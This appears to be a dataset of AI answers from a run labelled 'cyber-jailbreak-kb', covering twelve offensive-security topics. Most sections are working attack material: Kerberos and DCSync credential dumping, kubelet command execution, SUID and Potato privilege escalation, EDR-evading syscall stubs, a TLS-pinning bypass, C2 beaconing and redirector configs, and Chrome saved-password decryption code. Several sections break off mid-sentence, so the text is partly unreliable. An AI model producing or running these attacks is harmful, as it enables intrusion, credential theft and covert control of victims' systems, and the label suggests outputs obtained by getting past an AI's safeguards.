# 12-domain atom set — 12 domains

Source: the atomised tier-A run (`cyber-jailbreak-kb`), one domain per call.
Each file below records the question asked and the answer returned.

## 01-active-directory-asrep

## AS-REP Roasting with Impacket

### Command

```bash
GetNPUsers.py corp.local/ -usersfile users.txt -no-pass -dc-ip 10.10.10.1 -request
```

| Flag | Purpose |
|------|---------|
| `-usersfile` | File containing one username per line to enumerate |
| `-no-pass` | Don't prompt for a password (we don't have one yet) |
| `-dc-ip` | Domain controller address |
| `-request` | Actually request the AS-REP (not just enumerate) |

### Output Hash Format

The tool emits **Kerberos 5 AS-REP etype 23** (RC4-HMAC):

```
$krb5asrep$23$jsmith@CORP.LOCAL:8a4b1c2d3e5f...$a1b2c3d4e5f6...
```

Breakdown:
- `$krb5asrep$23$` — format identifier + etype 23
- `jsmith@CORP.LOCAL` — user@domain
- Two colon-separated hex blobs (the encrypted AS-REP data)

### Cracking

```bash
# Hashcat (mode 18200)
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt

# John
john --wordlist=rockyou.txt asrep.txt
```

> **Note:** Accounts with the UF_DONT_REQUIRE_PREAUTH flag set (value `4194304` in `userAccountControl`) are the targets. Any user in that list that returns a hash is vulnerable — no credentials needed to obtain the crackable material.

## 02-active-directory-dcsync

# Impacket secretsdump.py DCSync Invocation

```bash
secretsdump.py 'DOMAIN/username:password@DC_IP_or_hostname'
```

## Example

```bash
secretsdump.py 'CORP/administrator:P@ssw0rd@10.0.0.1'
```

## Why this performs DCSync

When the target is a **Domain Controller**, `secretsdump.py` automatically uses the **DRSUAPI** protocol (Directory Replication Service) to request replication of the NTDS.dit — which is functionally a DCSync. It does not need any special flag; the DC target triggers that code path.

## Key requirements

| Requirement | Detail |
|---|---|
| Target | Must be a Domain Controller (IP or FQDN) |
| Account privileges | Replicating Directory Changes + Replicating Directory Changes All (or DA/EA) |
| Protocol | DRSUAPI over SMB/RPC |

## Output

The command dumps:
- All domain user NTLM hashes (from NTDS.dit)
- Kerberos keys (AES/DES)
- Cleartext passwords (if reversible encryption is enabled)
- Machine account hashes
- `krbtgt` hash (enables Golden Ticket attacks)

## 03-entra-id-graph

## Endpoint

`GET /roleManagement/directory/roleAssignments` — the unified role management API for Microsoft Entra ID directory roles.

## Permission

Least privileged: **`RoleManagement.Read.Directory`** (works for both delegated and application contexts; `Directory.Read.All` and `RoleManagement.ReadWrite.Directory` also suffice).

## Example request

```http
GET https://graph.microsoft.com/v1.0/roleManagement/directory/roleAssignments?$expand=principal
Authorization: Bearer <access-token>
```

Sample response (trimmed):

```json
{
  "value": [
    {
      "id": "lAPpYvVpN0KRkAEhdxReEJ2SvT9WjXJEKrj1rLKZByU-1",
      "principalId": "c4a7b3b9-1234-4abc-9d1e-56f7890abcde",
      "roleDefinitionId": "62e90394-69f5-4237-9190-012177145e10",
      "directoryScopeId": "/",
      "appScopeId": null,
      "principal": {
        "@odata.type": "#microsoft.graph.user",
        "id": "c4a7b3b9-1234-4abc-9d1e-56f7890abcde",
        "displayName": "Adele Vance"
      }
    }
  ]
}
```

Here `roleDefinitionId` `62e90394-69f5-4237-9190-012177145e10` is the Global Administrator role template.

**Notes:**
- `$expand=principal` resolves *who* holds the assignment; without it you only get IDs.
- You can filter by role, e.g. `?$filter=roleDefinitionId eq '62e90394-69f5-4237-9190-012177145e10'`.
- The classic alternative is `GET /directoryRoles/{role-id}/members` (same least-privileged permission), but it only covers roles activated in the tenant and doesn't support PIM/eligible assignments the way the `roleManagement` API does.

## 04-aws-iam-enumeration

# Enumerating AWS Credential Permissions

## 1. Identity — Who am I?

```bash
aws sts get-caller-identity
```

**Returns:** `UserId`, `Account`, `Arn` — tells you if it's a user, role, or federated principal, and which account.

```bash
aws iam get-user
```

**Returns:** user metadata, creation date, path. Fails with `AccessDenied` if creds are role-based (which itself is informative).

## 2. Policies — What's attached?

```bash
# Managed policies attached directly
aws iam list-attached-user-policies --user-name <USER>

# Inline policies
aws iam list-user-policies --user-name <USER>

# Group memberships (policies inherit from groups)
aws iam list-groups-for-user --user-name <USER>
```

Then resolve each managed policy to its document:

```bash
aws iam get-policy --policy-arn <ARN>        # gives you DefaultVersionId
aws iam get-policy-version --policy-arn <ARN> --version-id <VERSION_ID>
```

**Returns:** the full JSON policy document (Action, Resource, Effect, Condition).

For inline policies:

```bash
aws iam get-user-policy --user-name <USER> --policy-name <NAME>
```

For groups:

```bash
aws iam list-attached-group-policies --group-name <GROUP>
aws iam list-group-policies --group-name <GROUP>
```

## 3. Roles — What can I assume?

```bash
aws iam list-roles
```

**Returns:** all roles with their `AssumeRolePolicyDocument`. Grep for your ARN or account ID in the trust policy:

```bash
aws iam list-roles --query 'Roles[?AssumeRolePolicyDocument]' --output json | grep -i <ACCOUNT_ID_OR_ARN>
```

Test assumption:

```bash
aws sts assume-role --role-arn <ROLE_ARN> --role-session-name enum
```

**Returns:** temporary `AccessKeyId`, `SecretAccessKey`, `SessionToken` — then re-run step 1–2 with `--profile` pointing at those creds.

## 4. Resources — What can I actually touch?

These confirm effective permissions and reveal the blast radius:

```bash
aws s3 ls                                          # buckets
aws ec2 describe-instances                         # compute
aws lambda list-functions                          # serverless
aws secretsmanager list-secrets                    # credentials/secrets
aws sns list-topics && aws sqs list-queues         # messaging
aws dynamodb list-tables                           # data
aws kms list-keys                                  # crypto material
aws rds describe-db-instances                      # databases
```

**Returns:** resource inventories. A successful call proves `Action` + `Resource` are permitted; a 403 proves they aren't.

## 5. Simulation — Effective permissions without guessing

```bash
aws iam simulate-principal-policy \
  --policy-source-arn <USER_OR_ROLE_ARN> \
  --action-names s3:GetObject ec2:RunInstances sts:AssumeRole \
  --resource-arns "*"
```

**Returns:** `EvaluationResult` per action — `allowed`, `implicitDeny`, `explicitDeny` — accounting for all attached policies, SCPs, and boundaries.

## 6. Bulk shortcut

```bash
aws iam get-account-authorization-details
```

**Returns:** a sing

## 05-kubernetes-kubelet

# Kubelet API on Port 10250

## GET /pods (Unauthenticated)

When anonymous auth is enabled (`--anonymous-auth=true`, the default) and authorization is set to `AlwaysAllow` (a common misconfiguration), an unauthenticated GET returns a full `PodList` JSON object:

```json
{
  "kind": "PodList",
  "apiVersion": "v1",
  "metadata": {},
  "items": [
    {
      "metadata": {
        "name": "nginx-abc123",
        "namespace": "default",
        ...
      },
      "spec": {
        "containers": [
          {
            "name": "nginx",
            "image": "nginx:1.25",
            ...
          }
        ],
        ...
      },
      "status": {
        "podIP": "10.244.0.5",
        "containerStatuses": [...],
        ...
      }
    }
  ]
}
```

This reveals pod names, namespaces, container names, images, IPs, volumes, env vars (which may contain secrets), and more.

---

## Exec / Run Command Endpoints

### Non-streaming: `POST /run/{namespace}/{pod}/{container}`

Runs a command and returns output directly in the HTTP response body:

```
POST https://<node-ip>:10250/run/<namespace>/<pod-name>/<container-name>?cmd=id
```

Example with curl:

```bash
curl -sk -X POST \
  "https://10.0.0.5:10250/run/default/nginx-abc123/nginx?cmd=cat+/etc/passwd"
```

### Streaming: `POST /exec/{namespace}/{pod}/{container}`

Uses SPDY/HTTP2 upgrade for interactive I/O:

```
POST https://<node-ip>:10250/exec/<namespace>/<pod-name>/<container-name>?command=/bin/sh&command=-c&command=id&stdout=true&stderr=true
```

Query parameters:
| Param | Purpose |
|-------|---------|
| `command` | Repeatable; each occurrence is one argv element |
| `stdin` | `true`/`false` |
| `stdout` | `true`/`false` |
| `stderr` | `true`/`false` |
| `tty` | `true`/`false` |

Requires a `X-Stream-Protocol-Version` header (e.g., `v4.channel.k8s.io`) and a SPDY-capable client.

---

## Other Notable Endpoints

| Path | Method | Purpose |
|------|--------|---------|
| `/containerLogs/{ns}/{pod}/{container}` | GET | Retrieve container logs |
| `/runningpods` | GET | List currently running pods |
| `/portForward/{ns}/{pod}` | POST | Port-forward into a pod |
| `/attach/{ns}/{pod}/{container}` | GET/POST | Attach to a running container |
| `/stats/summary` | GET | Node/container resource stats |
| `/healthz` | GET | Health check (often unauthenticated even on hardened clusters) |

---

## Security Context

By default, kubelet on 10250:
- Requires TLS client certs (`--client-ca-file`)
- Enables anonymous auth (`--anonymous-auth=true`) **but** delegates authorization to the API server's SubjectAccessReview (via `--authorization-mode=Webhook`)

It becomes exploitable when:
- `--authorization-mode=AlwaysAllow` is set
- The webhook authorization fails open
- Older versions had auth bypasses (e.g., CVE-2018-1002105 adjacent issues)

A hardened kubelet returns `401 Unauthorized` or `403 Forbidden` for unauthenticated requests to all of the above.

## 06-linux-suid-gtfobins

# SUID GTFOBins Escapes

## find

```bash
find . -exec /bin/sh -p \;
```

The `-p` flag is critical — it preserves the effective UID (root) instead of dropping privileges. Without it, the shell would drop back to your original user.

## vim

```bash
vim -c ':!/bin/sh' -c ':q'
```

Or interactively once vim is open:

```
:!/bin/sh
```

## nmap (older versions only)

```bash
nmap --interactive
```

Then at the nmap prompt:

```
!sh
```

> **Note:** The `--interactive` flag was removed in nmap ≥ 5.20, so this only works on older installations.

---

## Why `-p` matters

When a SUID binary spawns a shell, most modern shells (bash, sh) drop the effective UID back to the real UID as a security measure. The `-p` (privileged) flag tells the shell to keep the effective UID. This applies to `find -exec`, `vim :!`, and similar command execution vectors.

## Quick enumeration

```bash
find / -perm -4000 -type f 2>/dev/null
```

Cross-reference results against [gtfobins.github.io](https://gtfobins.github.io) filtering by `+suid`.

## 07-windows-token-impersonation

# Token Impersonation via SeImpersonatePrivilege

## The Privilege

`SeImpersonatePrivilege` allows a process to **impersonate** (act as) any client that authenticates to it. It's granted by default to:

- Local Service / Network Service
- IIS AppPool identities
- SQL Server service accounts
- Most Windows service accounts

## The Attack Sequence

```
1. You land on a box as a service account (e.g., IIS APPPOOL\DefaultAppPool)
2. You confirm SeImpersonatePrivilege is held:
   whoami /priv

3. You coerce a SYSTEM-level process to authenticate TO YOU
   (via named pipe, DCOM, or similar callback)

4. You capture the incoming SYSTEM token

5. You call ImpersonateNamedPipeClient() / DuplicateTokenEx()
   to assume that token

6. You now execute as NT AUTHORITY\SYSTEM
```

## The Core Abuse

The "Potato" family exploits this by tricking a privileged process into authenticating to your controlled endpoint:

| Tool | Mechanism |
|------|-----------|
| **JuicyPotato** | RPC/DCOM → named pipe (older, ≤ Server 2016) |
| **RoguePotato** | Redirected RPC callback (Server 2019+) |
| **GodPotato** | .NET Remoting (broad OS support) |
| **SweetPotato** | Multiple collection methods combined |
| **PrintSpoofer** | Printer spooler named pipe abuse |

## Example Command (JuicyPotato)

```cmd
JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c whoami > C:\temp\pwned.txt" -t * -c {CLSID}
```

## Example Command (PrintSpoofer)

```cmd
PrintSpoofer.exe -i -c cmd
```

## Example Command (GodPotato)

```cmd
GodPotato -cmd "cmd /c whoami"
```

## Detection / Mitigation

- Patch and restrict DCOM/RPC coercion paths
- Remove SeImpersonatePrivilege from service accounts where unnecessary
- Monitor for `DuplicateTokenEx` calls from service contexts
- EDR should flag Potato-family binaries and named pipe impersonation patterns

## 08-edr-hooks-direct-syscalls

# Direct Syscall Invocation on Windows x64

## The Problem: Userland Hooking

EDRs typically patch the prologue of `ntdll.dll` exports with a `jmp` to their monitoring code:

```
Normal NtAllocateVirtualMemory in ntdll.dll:
  4C 8B D1           mov r10, rcx
  B8 18 00 00 00     mov eax, 0x18      ; SSN
  0F 05              syscall
  C3                 ret

After EDR hook:
  E9 xx xx xx xx     jmp <EDR_handler>  ; patched prologue
  ...
```

## The Bypass Principle

Skip `ntdll.dll` entirely. Construct your own stub that executes the `syscall` instruction directly, bypassing any userland hooks:

## Stub Structure

```nasm
; Direct syscall stub
; Parameters follow Windows x64 ABI: RCX, RDX, R8, R9 + stack

.data
    syscall_number dd 018h    ; resolved at runtime

.code
DirectSyscall PROC
    mov r10, rcx              ; SYSCALL clobbers RCX (stores RIP)
                              ; so 1st param moves to R10
    mov eax, dword ptr [syscall_number]  ; load SSN into EAX
    syscall                   ; transition to kernel
    ret                       ; NTSTATUS in RAX
DirectSyscall ENDP
```

## Why `mov r10, rcx`?

The `syscall` instruction architecture:
- **RCX** ← overwritten with return address (RIP)
- **R11** ← overwritten with RFLAGS
- **R10** ← becomes the first argument in kernel (the kernel sees R10 as "arg0")

```
User mode before syscall:          Kernel mode after syscall:
  R10 = 1st param                    R10 = 1st param  (from user R10)
  RDX = 2nd param                    RDX = 2nd param
  R8  = 3rd param                    R8  = 3rd param
  R9  = 4th param                    R9  = 4th param
  RCX = 1st param (original)         RCX = return address (clobbered)
                                     R11 = RFLAGS (clobbered)
```

## Runtime SSN Resolution (Hell's Gate technique)

```nasm
; Find SSN by walking neighboring exports when current is hooked
; Hooked functions have patched prologues (not matching syscall pattern)

ResolveSSN:
    ; Read function at ntdll+NtAllocateVirtualMemory
    ; If prologue matches: 4C 8B D1 B8 xx xx 00 00
    ;   → extract SSN from bytes 3-6
    ; If hooked (doesn't match):
    ;   → walk to adjacent functions (idx ±1, ±2, ...)
    ;   → find unhooked neighbor, extract its SSN
    ;   → SSN is sequential: neighbor_SSN ± offset
```

## Full Example: NtAllocateVirtualMemory

```nasm
; Custom stub replacing hooked ntdll!NtAllocateVirtualMemory
; NTSTATUS NtAllocateVirtualMemory(
;   HANDLE    ProcessHandle,   // RCX → R10
;   PVOID    *BaseAddress,     // RDX
;   ULONG     ZeroBits,        // R8
;   PSIZE_T   RegionSize,      // R9
;   ULONG     AllocationType,  // [rsp+28h]
;   ULONG     Protect          // [rsp+30h]
; );

NtAllocateVirtualMemory_Direct:
    mov r10, rcx                    ; ProcessHandle → R10
    mov eax, 018h                   ; SSN (Win10 x64 build varies)
    syscall
    ret
```

## Call from C

```c
extern NTSTATUS NtAllocateVirtualMemory_Direct(
    HANDLE ProcessHandle,
    PVOID

## 09-ghidra-headless

```bash
/opt/ghidra/support/analyzeHeadless /data/ghidra-projects MyAnalysis \
    -import /binaries/target.elf \
    -scriptPath /home/user/ghidra-scripts \
    -postScript ExportFuncs.java \
    -log /data/ghidra-projects/analysis.log \
    -overwrite
```

**Windows equivalent:**

```bat
C:\ghidra_11.x\support\analyzeHeadless.bat D:\ghidra-projects MyAnalysis -import D:\binaries\target.exe -scriptPath D:\scripts -postScript ExportFuncs.java -overwrite
```

**Key points:**

- `analyzeHeadless <project_location> <project_name>` — the first two positional args define where the `.gpr` project is written. Ghidra creates `/data/ghidra-projects/MyAnalysis.gpr` and its associated directory if they don't exist.
- `-import <binary>` — imports and auto-analyzes the binary. Omit analysis with `-noanalysis`.
- `-scriptPath` — adds a directory to search for scripts; `-postScript` runs *after* analysis completes. Scripts can take arguments: `-postScript ExportFuncs.java /tmp/out.csv`.
- `-overwrite` — replaces an existing program of the same name in the project; without it, re-imports fail.
- `-log` — captures analyzer output; script `println` output goes to stdout.

**Re-running a script on an already-imported program** (no re-import, no re-analysis):

```bash
/opt/ghidra/support/analyzeHeadless /data/ghidra-projects MyAnalysis \
    -process target.elf \
    -scriptPath /home/user/ghidra-scripts \
    -postScript ExportFuncs.java \
    -noanalysis
```

Inside the script, the imported program is available as the `currentProgram` script binding, and `currentProgram.getDomainFile()` lets you save or inspect project state.

## 10-frida-ssl-pinning

# Frida Scripts

## 1. Log Arguments of a Java Method

```javascript
Java.perform(function () {
    var TargetClass = Java.use("com.example.app.TargetClass");

    TargetClass.targetMethod.overload("java.lang.String", "int")
        .implementation = function (strArg, intArg) {

        console.log("[*] targetMethod called");
        console.log("    strArg: " + strArg);
        console.log("    intArg: " + intArg);

        // Optionally inspect object fields
        // console.log("    field: " + this.someField.value);

        var result = this.targetMethod(strArg, intArg);
        console.log("    return: " + result);
        return result;
    };
});
```

### Generic version (hook any overload automatically)

```javascript
Java.perform(function () {
    var TargetClass = Java.use("com.example.app.TargetClass");
    var overloads = TargetClass.myMethod.overloads;

    overloads.forEach(function (overload) {
        overload.implementation = function () {
            var args = [];
            for (var i = 0; i < arguments.length; i++) {
                args.push("arg" + i + ": " + arguments[i]);
            }
            console.log("[*] myMethod(" + args.join(", ") + ")");
            return this.myMethod.apply(this, arguments);
        };
    });
});
```

---

## 2. Disable TrustManager Certificate Pinning

```javascript
Java.perform(function () {
    console.log("[*] Starting SSL pinning bypass...");

    // --- TrustManagerImpl (Android default) ---
    try {
        var TrustManagerImpl = Java.use("com.android.org.conscrypt.TrustManagerImpl");
        TrustManagerImpl.verifyChain.implementation = function (untrustedChain, trustAnchorChain, host, clientAuth, ocspData, tlsSctData) {
            console.log("[+] Bypassing TrustManagerImpl (host: " + host + ")");
            return untrustedChain;
        };
    } catch (e) {
        console.log("[-] TrustManagerImpl not found: " + e);
    }

    // --- OkHttp CertificatePinner ---
    try {
        var CertificatePinner = Java.use("okhttp3.CertificatePinner");
        CertificatePinner.check.overload("java.lang.String", "java.util.List")
            .implementation = function (hostname, peerCertificates) {
                console.log("[+] Bypassing OkHttp CertificatePinner: " + hostname);
                return;
            };
    } catch (e) {
        console.log("[-] OkHttp CertificatePinner not found: " + e);
    }

    // --- TrustManager (custom implementations) ---
    try {
        var X509TrustManager = Java.use("javax.net.ssl.X509TrustManager");
        var SSLContext = Java.use("javax.net.ssl.SSLContext");

        var TrustManager = Java.registerClass({
            name: "com.frida.TrustAllManager",
            implements: [X509TrustManager],
            methods: {
                checkClientTrusted: function (chain, authType) {},
                checkServerTrusted: function (chain, authType) {},
                getAcceptedIssuers: function () {
                    return [];
   

## 11-c2-jitter-redirector

# C2 Profile: Sleep/Jitter & Redirector Architecture

## Sleep & Jitter Settings

### Cobalt Strike (Malleable C2 Profile)

```
set sleeptime "45000";      // 45 seconds between check-ins
set jitter    "30";         // ±30% randomization (31.5s–58.5s actual)
```

**What this means operationally:**

- **Sleeptime** — how long an implant waits before polling the teamserver
- **Jitter** — percentage variance applied to sleep, so check-ins aren't metronomic

### Example ranges by OPSEC posture

| Phase | Sleep | Jitter | Rationale |
|-------|-------|--------|-----------|
| Initial foothold / tasking | 15–30s | 10–20% | Fast interaction |
| Sustained dwell | 5–15 min | 20–40% | Blend into noise |
| Long-term dormant | 1–6 hrs | 30–50% | Minimal footprint |

### Other frameworks

**Sliver (Go-based):**
```go
// Implant config
sliver > new-operator --name team
sliver > beacons --skip-reconnect
// Per-implant:
sliver > use <implant>
sliver > set beacon-interval 60s
sliver > set beacon-jitter 0.3
```

**Mythic:**
```json
// Payload type config (e.g., Apollo)
{
  "sleep": 60,
  "jitter": 25
}
```

**Custom C2 (typical pattern):**
```python
import random, time

def get_sleep(base, jitter_pct):
    variance = base * (jitter_pct / 100)
    return base + random.uniform(-variance, variance)

while True:
    time.sleep(get_sleep(45, 30))  # 31.5–58.5s
    check_in()
```

---

## Standard Redirector Chain

```
[Target Network]
      │
      ▼
┌──────────────┐
│  Redirector  │  ← First-hop, disposable, domain fronted/CDN
│ (e.g., VPS)  │
└──────┬───────┘
       │
       ▼
┌──────────────┐
│  Redirector  │  ← Second-hop (optional, adds resilience)
│  or CDN/WAF  │
└──────┬───────┘
       │
       ▼
┌──────────────┐
│  Teamserver  │  ← Never directly internet-facing
│ (C2 server)  │
└──────────────┘
```

### Common redirector implementations

**1. socat (simple TCP forward)**
```bash
socat TCP4-LISTEN:443,fork TCP4:TEAMSERVER_IP:443
```

**2. iptables DNAT**
```bash
iptables -t nat -A PREROUTING -p tcp --dport 443 -j DNAT --to-destination TEAMSERVER_IP:443
iptables -t nat -A POSTROUTING -j MASQUERADE
```

**3. Nginx reverse proxy (with filtering)**
```nginx
server {
    listen 443 ssl;
    server_name legitimate.example.com;

    ssl_certificate     /etc/letsencrypt/live/.../fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/.../privkey.pem;

    location / {
        # URI filtering — only forward expected C2 URIs
        if ($uri != "/api/v2/telemetry") {
            return 404;
        }
        proxy_pass https://TEAMSERVER_IP:443;
        proxy_set_header Host $host;
    }
}
```

**4. Apache mod_rewrite (user-agent filtering)**
```apache
RewriteEngine On
# Only forward if UA matches profile
RewriteCond %{HTTP_USER_AGENT} "^Mozilla/5\.0 \(Windows NT 10\.0; Win64; x64\)$"
RewriteRule ^/api/v2/telemetry$ https://TEAMSERVER_IP:443%{REQUEST_URI} [P]

# Everything else gets a decoy
RewriteRule .* https://google.com [L,R=302]
```

---

## Typical Full Stack



## 12-chrome-aes-gcm

# Chrome Password Encryption on Windows (Current Versions)

## Byte Layout of the Encrypted Blob

The `password_value` column in the `Login Data` SQLite database stores:

```
┌──────────┬──────────────┬────────────────────┬──────────────┐
│ "v10"    │  Nonce (IV)  │    Ciphertext      │  GCM Tag     │
│ 3 bytes  │  12 bytes    │    N bytes         │  16 bytes    │
└──────────┴──────────────┴────────────────────┴──────────────┘
```

- **Prefix**: ASCII `"v10"` (or `"v11"` for app-bound encryption in Chrome 127+)
- **Nonce**: 12-byte random IV for AES-256-GCM
- **Ciphertext**: variable-length encrypted password
- **Tag**: 16-byte GCM authentication tag (appended at the end)

## Key Retrieval from Local State

The `Local State` JSON file (at `%LOCALAPPDATA%\Google\Chrome\User Data\Local State`) contains:

```json
{
  "os_crypt": {
    "encrypted_key": "RFBBUEkB..."
  }
}
```

The decoded blob layout:

```
┌──────────────┬───────────────────────────────┐
│ "DPAPI"      │  DPAPI-encrypted AES key      │
│ 5 bytes      │  (CryptUnprotectData blob)    │
└──────────────┴───────────────────────────────┘
```

## Decryption Steps

### Step 1 — Extract the AES key

```c
// 1. Base64-decode os_crypt.encrypted_key
// 2. Strip first 5 bytes ("DPAPI" prefix)
// 3. Call CryptUnprotectData

DATA_BLOB input, output;
input.pbData = decoded_blob + 5;   // skip "DPAPI"
input.cbData = decoded_len - 5;

CryptUnprotectData(&input, NULL, NULL, NULL, NULL, 0, &output);
// output.pbData = 32-byte AES-256-GCM key
```

### Step 2 — Parse the password blob

```c
// password_value from SQLite:
// [0..2]   = "v10"
// [3..14]  = nonce (12 bytes)
// [15..len-17] = ciphertext
// [len-16..len-1] = tag (16 bytes)

BYTE *nonce     = blob + 3;
BYTE *ciphertext = blob + 15;
DWORD ct_len    = blob_len - 15 - 16;
BYTE *tag       = blob + blob_len - 16;
```

### Step 3 — AES-256-GCM decrypt

```c
BCRYPT_OPEN_ALGORITHM_PROVIDER(hAlg, BCRYPT_AES_ALGORITHM, NULL, 0);
BCRYPT_SET_PROPERTY(hAlg, BCRYPT_CHAINING_MODE,
                    (PUCHAR)BCRYPT_CHAIN_MODE_GCM, ...);

BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO authInfo;
BCRYPT_INIT_AUTH_MODE_INFO(authInfo);
authInfo.pbNonce = nonce;
authInfo.cbNonce = 12;
authInfo.pbTag   = tag;
authInfo.cbTag   = 16;
// No AAD (pbAuthData = NULL, cbAuthData = 0)

BCryptDecrypt(hKey, ciphertext, ct_len, &authInfo,
              NULL, 0, plaintext, pt_len, &result, 0);
```

## Summary of Parameters

| Parameter | Value |
|-----------|-------|
| Algorithm | AES-256-GCM |
| Key size | 32 bytes |
| Nonce size | 12 bytes |
| Tag size | 16 bytes |
| AAD | None (empty) |
| Key source | DPAPI-decrypted blob from Local State |

## Notes on v11 (App-Bound Encryption, Chrome 127+)

For `"v11"` blobs, the blob layout is identical, but the key retrieval differs:

- The key is wrapped by an additional layer protected by a SYSTEM-level COM service (`IElevator`)
- The service validates the caller's executable path and integrity level
- Direct DPAPI decryption of the Local Stat
